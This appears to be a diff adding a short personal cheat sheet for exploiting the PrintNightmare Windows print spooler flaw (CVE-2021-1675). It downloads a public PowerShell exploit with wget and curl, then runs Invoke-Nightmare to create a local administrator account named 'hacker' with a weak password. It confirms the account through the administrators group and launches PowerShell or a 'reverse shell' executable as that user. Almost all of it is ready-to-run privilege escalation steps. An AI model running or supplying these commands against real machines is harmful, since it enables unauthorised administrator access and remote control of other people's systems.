@@ -1,0 +1,30 @@
+https://github.com/calebstewart/CVE-2021-1675
+
+wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1
+curl https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1 -o CVE-2021-1675.ps1
+
+In Powershell,
+
+`Import-Module .\ CVE-2021-1675.ps1`
+
+Create a new admin user
+
+`Invoke-Nightmare -NewUser "<username to create >" -NewPassword <password for that new user> DriverName "PrintMe"`
+  
+`Invoke-Nightmare -NewUser "hacker" -NewPassword "password1234" DriverName "PrintMe"`
+
+Check if user was added
+
+`net localgroup administrators`
+
+Run powershell as SYSTEM
+
+`runas /user:hacker powershell.exe`
+ 
+ or reverse shell
+ 
+`runas /user:hacker shell.exe`
+
+  
+  
+https://www.hackercoolmagazine.com/printnightmare-privilege-escalation-with-powershell/
